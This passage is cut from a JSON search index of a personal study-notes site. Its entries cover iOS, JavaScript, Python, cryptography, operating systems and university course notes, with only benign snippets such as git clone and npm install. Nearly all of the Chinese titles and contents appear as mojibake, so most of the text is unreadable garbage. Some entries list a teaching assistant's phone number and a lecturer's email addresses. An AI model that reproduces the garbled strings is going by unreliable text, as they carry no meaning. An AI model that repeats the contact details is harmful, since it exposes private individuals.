"},{"id":471,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/","title":"HOMEWORK","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"HOMEWORK #  "},{"id":472,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/","title":"HOMEWORK","section":"æ“ä½œç³»ç»Ÿ","content":"HOMEWORK #  "},{"id":473,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/html5/","title":"html5","section":"JavaScript","content":"html5 #  "},{"id":474,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/","title":"iOS","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":" å‚è€ƒèµ„æ–™ï¼š\n Objective-C å®˜æ–¹æ–‡æ¡£ï¼šhttps://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/ObjectiveC/Introduction/introObjectiveC.html è‹¹æœ APIï¼šhttps://developer.apple.com/documentation/ èœé¸Ÿæ•™ç¨‹ç®€å•ä»‹ç»ï¼šhttps://www.runoob.com/w3cnote/objective-c-tutorial.html   Objective-C #  é¢è¯•é¢˜ç›®èµ„æ–™ï¼š\n https://www.jianshu.com/p/ba64e98b8e59 https://www.jianshu.com/p/89978870f49f https://www.jianshu.com/p/e87e0be2281f  "},{"id":475,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/","title":"iOSé€†å‘åˆ†æ","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":" å­¦ä¹ é€”å¾„ï¼š\n åˆ˜åŸ¹åº†ï¼šã€ŠiOS åº”ç”¨é€†å‘ä¸å®‰å…¨ã€‹   README #  "},{"id":476,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/","title":"JAVA","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"JAVA #  "},{"id":477,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/","title":"JavaScript","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"HTML-CSS #  "},{"id":478,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/","title":"lab1","section":"HOMEWORK","content":"lab1 #  "},{"id":479,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab2/","title":"lab2","section":"HOMEWORK","content":"lab2 #  "},{"id":480,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab3/","title":"lab3","section":"HOMEWORK","content":"lab3 #  "},{"id":481,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab4/","title":"lab4","section":"HOMEWORK","content":"lab4 #  "},{"id":482,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/","title":"Linux-Command","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"Linux-Command #  å¸¸ç”¨ Linux å‘½ä»¤æ±‡æ€»\n"},{"id":483,"href":"/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/","title":"Linuxæºç é˜…è¯»","section":"é¡¹ç›®åº•å±‚å®ç°","content":"LinuxAudit #  "},{"id":484,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/macos/","title":"MacOS","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"README #  è®ºå¦‚ä½•é«˜æ•ˆåœ°ä½¿ç”¨ Mac OS Xã€‚\n"},{"id":485,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/","title":"nodejs","section":"JavaScript","content":" W3school å­¦ä¹ ï¼š\n https://www.w3schools.com/nodejs/  èœé¸Ÿæ•™ç¨‹ï¼š\n https://www.runoob.com/nodejs/nodejs-tutorial.html   README #  ä»€ä¹ˆæ˜¯ node.js?\n å…è´¹çš„ã€è·¨å¹³å°çš„ã€ä»¥ javascript ä½œä¸ºè¯­è¨€çš„å¼€æºæœåŠ¡å™¨ç¯å¢ƒã€‚  node.js å¯ä»¥åšä»€ä¹ˆï¼Ÿ\n ç”Ÿæˆä¸€ä¸ªåŠ¨æ€çš„å‰ç«¯é¡µé¢ï¼› å¯ä»¥æ“ä½œæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿã€æ•°æ®åº“ï¼› å¯ä»¥æ¥å—å¤„ç†è¡¨å•ä¿¡æ¯ã€‚  "},{"id":486,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/","title":"Objective-C\u0026SDK","section":"iOS","content":"åŸºç¡€çŸ¥è¯† #  Objective-C çš„å…¥å£å‡½æ•°æ˜¯ main.m æ–‡ä»¶ä¸­çš„ main å‡½æ•°ï¼Œå®ƒçš„ä¼ å…¥å‚æ•°ä¸ C ä¸­ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚\næ¯”å¦‚ä¸€ä¸ª HelloWorld ç¨‹åºåº”è¯¥é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼ç¼–å†™ï¼š\n#import \u0026lt;UIKit/UIKit.h\u0026gt;  int main(int argc, char * argv[]) {  NSLog(@\u0026#34;Hello World!\u0026#34;); \treturn 0; } "},{"id":487,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/ctf-writeup/pwnable/","title":"pwnable","section":"CTF-WriteUp","content":"pwnable #  "},{"id":488,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/","title":"Python","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":"Python #  æœ‰å…³ python åŸºç¡€çŸ¥è¯†å’Œä¸€äº›åº“çš„ä½¿ç”¨ã€‚\n"},{"id":489,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reactjs/","title":"reactjs","section":"JavaScript","content":"README #   å­¦ä¹ è·¯å¾„ï¼šByteDance æŠ€æœ¯å­¦é™¢\n "},{"id":490,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/","title":"Redis","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"Redis #  è¯»ä¹¦ç¬”è®°ï¼šã€ŠRedis è®¾è®¡ä¸å®ç°ï¼ˆç¬¬äºŒç‰ˆï¼‰ã€‹\næºä»£ç åœ°å€ï¼šhttps://github.com/redis/redis.git\n"},{"id":491,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/","title":"Runtime","section":"iOS","content":"Runtime #  iOS è¿è¡Œæ—¶æºç ä¸‹è½½ï¼š\n$ git clone git@github.com:opensource-apple/objc4.git "},{"id":492,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/","title":"Swift\u0026SDK","section":"iOS","content":"README #   èœé¸Ÿæ•™ç¨‹ï¼š\n https://www.runoob.com/swift/swift-tutorial.html   xcode æä¾›äº† playground åŠŸèƒ½å­¦ä¹  swift çš„åŸºç¡€è¯­æ³•ã€‚\nè‹¥è¦åˆ›å»º OS X çš„ playgroundï¼Œéœ€è¦ä½¿ç”¨å¼•å…¥ Cocoaï¼š\nimport Cocoa è‹¥è¦åˆ›å»º iOS çš„ playgroundï¼Œåˆ™éœ€è¦å¼•å…¥ UIKitï¼š\nimport UIKit è¾“å…¥è¾“å‡ºå¯ä»¥ç”¨ï¼š\nprint(\u0026#34;Hello World\u0026#34;)  let world = readLine() "},{"id":493,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/tutorial/","title":"Tutorial","section":"Django","content":"Tutorial #  "},{"id":494,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/tutorial/","title":"Tutorial","section":"Flask","content":" å­¦ä¹ ç½‘å€ï¼š\n http://flask.pocoo.org/docs/1.0/tutorial/   Tutorial #  tutorial é¡¹ç›®çš„ç½‘å€ï¼šhttps://github.com/pallets/flask/tree/1.0.2/examples/tutorial\n"},{"id":495,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/","title":"typescript","section":"JavaScript","content":" å®˜æ–¹ï¼š\n https://www.tslang.cn/docs/handbook/typescript-in-5-minutes.html   TypeScript #  TypeScript æ˜¯ JavaScript çš„ä¸€ä¸ªè¶…é›†ï¼Œæ”¯æŒ ECMAScript 6 æ ‡å‡†ã€‚\nå¦‚æœä½ çš„æœ¬åœ°ç¯å¢ƒå·²ç»å®‰è£…äº† npm å·¥å…·ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å®‰è£…ï¼š\nnpm install -g typescript ç¼–è¯‘é€‰é¡¹è§æ–‡æ¡£ï¼š\n https://www.tslang.cn/docs/handbook/compiler-options.html https://www.typescriptlang.org/docs/handbook/compiler-options.html  "},{"id":496,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/vuejs/","title":"vuejs","section":"JavaScript","content":"README #  å‰ç«¯å­¦ä¹ ç¬”è®°ï¼šå­¦ä¹  Vue æ¡†æ¶ã€‚\n å­¦ä¹ ç½‘å€ï¼šhttps://cn.vuejs.org/v2/guide/index.html#\n "},{"id":497,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/","title":"WxMiniProgram","section":"å·¥å…·ä½¿ç”¨æ¥å£","content":" å­¦ä¹ åœ°å€ï¼š\n https://developers.weixin.qq.com/miniprogram/dev/   å¾®ä¿¡å°ç¨‹åºå¼€å‘ #  åœ¨è…¾è®¯çš„æä¾›çš„å®˜ç½‘ä¸Šå­¦ä¹ å¾®ä¿¡å°ç¨‹åºå¼€å‘ã€‚\nFrameWork #   å­¦ä¹ åœ°å€ï¼š\n https://developers.weixin.qq.com/miniprogram/dev/framework/MINA.html åŸºæœ¬ä¸Šå°±æ˜¯æŠ„è¿‡æ¥çš„   "},{"id":498,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/","title":"Xman3å¤ä»¤è¥","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"README #  2018 å¹´å¤å­£ï¼Œ8.1-8.18 åœ¨å—å¼€ä¸¾åŠçš„ç¬¬ä¸‰å±Š XMAN ä¿¡æ¯å®‰å…¨å¤ä»¤è¥å­¦ä¹ ç¬”è®°ã€‚\n"},{"id":499,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/","title":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":" å­¦ä¹ é€”å¾„ï¼š\n 2019 å¹´ä¸ŠåŠå­¦å¹´ï¼Œè´¾æ˜¥ç¦è€å¸ˆã€Šä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€ã€‹   ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€ #  "},{"id":500,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/","title":"å…¬é’¥å¯†ç ä½“åˆ¶","section":"å¯†ç å­¦","content":"å…¬é’¥å¯†ç ä½“åˆ¶æ€»ç»“ #     å¯†ç ä½“åˆ¶ å®‰å…¨æ€§åŸºäºçš„éš¾é¢˜     èƒŒåŒ…å¯†ç ä½“åˆ¶ èƒŒåŒ…éš¾é¢˜   RSA å¤§æ•´æ•°åˆ†è§£é—®é¢˜   Rabinå¯†ç ä½“åˆ¶ï¼ˆRSA çš„ä¸€ç§ï¼‰ å¤§æ•´æ•°åˆ†è§£é—®é¢˜   Williams å¯†ç ä½“åˆ¶ï¼ˆå¯¹ Rabin çš„æ”¹è¿›ï¼‰ å¤§æ•´æ•°åˆ†è§£é—®é¢˜   Diffe-Hellman å¯†é’¥äº¤æ¢åè®® ç¦»æ•£å¯¹æ•°é—®é¢˜   ElGamal å¯†ç  æœ‰é™åŸŸä¸Šç¦»æ•£å¯¹æ•°é—®é¢˜   ECC æ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°é—®é¢˜   Regev åŠ å¯† æ ¼å›°éš¾é—®é¢˜   NTRU æ ¼ä¸­æœ€çŸ­å‘é‡é—®é¢˜   McEliece å¯†ç  çº é”™ç¼–ç ç†è®º   Shamir-(t,n) é—¨é™æ–¹æ¡ˆ Lagrangeå†…æ’å¤šé¡¹å¼   FeistelåŠ å¯† ä»£æ¢å’Œç½®æ¢   Asmuth\u0026amp;Bloom-(t,n) é—¨é™ ä¸­å›½å‰©ä½™å®šç†   MI æ–¹æ¡ˆ å¤šå˜é‡é—®é¢˜    "},{"id":501,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F-mit8.624/","title":"åˆ†å¸ƒå¼ç³»ç»Ÿ","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"åˆ†å¸ƒå¼ç³»ç»Ÿ #  è¯¾ç¨‹å­¦ä¹ å‚è€ƒèµ„æ–™ MIT 6.824ï¼šhttps://pdos.csail.mit.edu/6.824/\nå…¶ä»–èµ„æ–™ï¼š\n http://learn.lianglianglee.com/%E4%B8%93%E6%A0%8F/24%E8%AE%B2%E5%90%83%E9%80%8F%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%AE%8C  "},{"id":502,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/","title":"åˆ†ç»„å¯†ç ä½“åˆ¶","section":"å¯†ç å­¦","content":"åˆ†ç»„å¯†ç ä½“åˆ¶ #  åˆ†ç»„å¯†ç ç®—æ³•å·¥ä½œæ¨¡å¼ï¼ˆblock cipher operation modeï¼‰ï¼š\n ç”µç æœ¬å·¥ä½œæ¨¡å¼ï¼ˆECBï¼‰ï¼› å¯†ç åˆ†ç»„é“¾æ¥å·¥ä½œæ¨¡å¼ï¼ˆCBCï¼‰ï¼› å¯†ç åé¦ˆå·¥ä½œæ¨¡å¼ï¼ˆCFBï¼‰ï¼› è¾“å‡ºåé¦ˆå·¥ä½œæ¨¡å¼ï¼ˆOFBï¼‰ï¼› è®¡æ•°å™¨å·¥ä½œæ¨¡å¼ï¼ˆCTRï¼‰ç­‰ã€‚  "},{"id":503,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%89%91%E6%8C%87offer/","title":"å‰‘æŒ‡ Offer","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"å‰‘æŒ‡ Offer #  "},{"id":504,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/","title":"å›½å¯†ç®—æ³•","section":"å¯†ç å­¦","content":"å›½å¯†ç®—æ³• #  å››ç§åŠ å¯†ç®—æ³•ï¼ˆgithub å®ç°ï¼‰ï¼š\n SM1ï¼šå¯¹ç§°åŠ å¯†ç®—æ³•ï¼ŒåŠ å¯†å¼ºåº¦ 128 ä½ï¼ˆåŠ å¯†æµç¨‹ä¿å¯†ï¼‰ï¼› SM2ï¼šåŸºäº ECC çš„ 256 ä½éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼› SM3ï¼š256 ä½çš„æ¶ˆæ¯æ‘˜è¦ç®—æ³•ï¼› SM4ï¼š128 ä½çš„åˆ†ç»„å¯¹ç§°åŠ å¯†ç®—æ³•ã€‚  "},{"id":505,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/","title":"å®éªŒé¡¹ç›®ç»„æˆ","section":"æ“ä½œç³»ç»Ÿ","content":"å®éªŒé¡¹ç›®ç»„æˆ #  "},{"id":506,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/","title":"å¯†ç å­¦","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"å¯†ç å­¦ #  è¿™é‡Œåªæœ‰ä¸Šè¯¾çš„ä½œä¸šã€‚ç†è®ºéƒ¨åˆ†è¯¦è§ï¼šå¯†ç å­¦\n"},{"id":507,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","title":"æ€§èƒ½ä¼˜åŒ–","section":"iOS","content":"æ€§èƒ½ä¼˜åŒ– #  "},{"id":508,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/","title":"æ¶æ„ä»£ç åˆ†æ","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":" å­¦ä¹ é€”å¾„ï¼š\n 2019 å¹´ä¸ŠåŠå­¦å¹´ç‹å¿—ã€Šæ¶æ„ä»£ç åˆ†æã€‹   æ¶æ„ä»£ç åˆ†æ #  æ¶æ„ä»£ç åˆ†æçš„ä¸Šæœºè¯¾å®éªŒä½œä¸š\n"},{"id":509,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"æ“ä½œç³»ç»Ÿ","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"æ“ä½œç³»ç»Ÿ #  å‚è€ƒä¹¦ç±ï¼šã€Šç°ä»£æ“ä½œç³»ç»Ÿã€‹\n"},{"id":510,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/","title":"æ•°å­—é€»è¾‘","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"README #  2018-2019 å­¦å¹´ç¬¬ä¸€å­¦æœŸæ•°å­—é€»è¾‘è¯¾å ‚ç¬”è®°ã€‚\n æˆè¯¾è€å¸ˆï¼šç¨‹ä»æ´ª\nåŠ©æ•™ï¼šé‚±é›¨ï¼Œ18526649330\n "},{"id":511,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/","title":"æ•°æ®åº“ç³»ç»ŸåŸç†","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"æ•°æ®åº“ç³»ç»ŸåŸç† #  "},{"id":512,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","title":"æ•°æ®ç»“æ„","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"README #  è¿™æ˜¯é€šè¿‡ Data Structres and Program Design in C++ è¿™æœ¬ä¹¦å­¦ä¹ æ•°æ®ç»“æ„çš„ç¬”è®°ã€‚\n"},{"id":513,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/","title":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":" å­¦ä¹ ç½‘å€ï¼š\n https://developers.google.cn/machine-learning/crash-course/ml-intro   Introduction to machine learning.\n"},{"id":514,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/","title":"æ¦‚ç‡è®º","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"æ¦‚ç‡è®º #  "},{"id":515,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%B0%91%E6%B3%95%E6%80%BB%E8%AE%BA/","title":"æ°‘æ³•æ€»è®º","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"æ°‘æ³•æ€»è®º #  "},{"id":516,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/","title":"ç™½å¸½å­è®²WEBå®‰å…¨","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"ç™½å¸½å­è®²WEBå®‰å…¨ #  "},{"id":517,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/","title":"ç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":" å­¦ä¹ é€”å¾„ï¼š\n 2019 å¹´ä¸Šç­å­¦å¹´è‹æ˜è€å¸ˆã€Šç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶ã€‹   ç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶ #  "},{"id":518,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/","title":"ç®—æ³•ç«èµ›å…¥é—¨ç»å…¸","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"README #  é˜…è¯» ã€Šç®—æ³•ç«èµ›å…¥é—¨ç»å…¸ã€‹ ä¸€ä¹¦çš„è¯»ä¹¦ç¬”è®°ã€‚\n"},{"id":519,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97/","title":"ç®—æ³•ç«èµ›è¿›é˜¶æŒ‡å—","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"README #  æç…œä¸œã€Šç®—æ³•ç«èµ›è¿›é˜¶æŒ‡å—ã€‹ä¸€ä¹¦å­¦ä¹ ç¬”è®°ã€‚\n"},{"id":520,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/","title":"çº¿æ€§ä»£æ•°-MIT18.06","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"çº¿æ€§ä»£æ•°-MIT18.06 #  "},{"id":521,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BB%8F%E6%B5%8E%E6%B3%95/","title":"ç»æµæ³•","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"ç»æµæ³• #  "},{"id":522,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/","title":"ç¼–è¯‘åŸç†","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"README #  2018-2019å­¦å¹´ç¬¬ä¸€å­¦æœŸï¼Œç¼–è¯‘åŸç†è¯¾ç¨‹å­¦ä¹ è¯¾å ‚ç¬”è®°ã€‚\n æˆè¯¾è€å¸ˆï¼šæå¿ ä¼Ÿã€‚\nè€å¸ˆåŠå…¬åœ°ç‚¹ï¼šè®¡æ§æ¥¼409ã€‚\né‚®ç®±ï¼šmwgzwp@nbjl.nankai.edu.cn; lizhongwei@nbjl.nankai.edu.cn\n ç¼–è¯‘åŸç†è¯¾ç¨‹çš„é‡ç‚¹æ˜¯ è¯æ³•åˆ†æ å’Œ è¯­æ³•åˆ†æã€‚\n"},{"id":523,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/","title":"ç½‘ç»œåŸºæœ¬åŠŸ","section":"è®¡ç®—æœºç½‘ç»œ","content":"ç½‘ç»œåŸºæœ¬åŠŸåšå®¢ #  "},{"id":524,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/","title":"èœé¸ŸåŸºç¡€æ•™ç¨‹","section":"JAVA","content":" å­¦ä¹ è·¯å¾„ï¼š\n http://www.runoob.com/java/java-tutorial.html   èœé¸ŸåŸºç¡€æ•™ç¨‹ #  "},{"id":525,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","title":"èœé¸Ÿé¢å‘å¯¹è±¡","section":"JAVA","content":"èœé¸Ÿé¢å‘å¯¹è±¡ #  "},{"id":526,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/","title":"è®¡ç®—å¹¿å‘Š","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"ã€Šè®¡ç®—å¹¿å‘Šã€‹é˜…è¯»ç¬”è®° #  "},{"id":527,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","title":"è®¡ç®—æœºç½‘ç»œ","section":"ç³»ç»Ÿç†è®ºè¯¾ç¨‹","content":"README #  2018-2019 å­¦å¹´ç¬¬ä¸€å­¦æœŸè®¡ç®—æœºç½‘ç»œè¯¾å 